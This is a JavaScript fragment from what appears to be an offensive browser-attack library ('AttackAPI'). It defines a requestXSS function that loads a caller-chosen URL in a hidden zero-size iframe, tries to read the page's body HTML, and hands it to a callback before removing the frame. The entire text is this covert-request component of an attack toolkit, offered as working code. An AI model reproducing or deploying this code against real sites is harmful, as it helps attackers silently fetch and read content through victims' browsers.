
AttackAPI.requestXSS = function (request) {
	var tmr = null;
	
	var ifr = document.createElement('iframe');
	ifr.style.visibility = 'hidden';
	ifr.style.width = ifr.style.height = 0;
	ifr.onload = function () {
		window.clearTimeout(tmr);
		
		var data = null;
		try {
			data = this.getDocument(ifr).body.innerHTML;
		} catch (e) {}	
		
		ifr.src = '';
		document.body.removeChild(ifr);
		
		if (typeof(request.onload) == 'function')
			request.onload({data: data}, request);
	};
	
	if (request.query)
		ifr.src = request.url + '?' + this.buildQuery(request.query);
	else
		ifr.src = request.url;
		
	document.body.appendChild(ifr);
			
	tmr = window.setTimeout(function () {
		ifr.src = '';
		document.body.removeChild(ifr);

		if (typeof(request.ontimeout) == 'function')
			request.ontimeout(request);
	}, request.timeout?request.timeout:1000);
};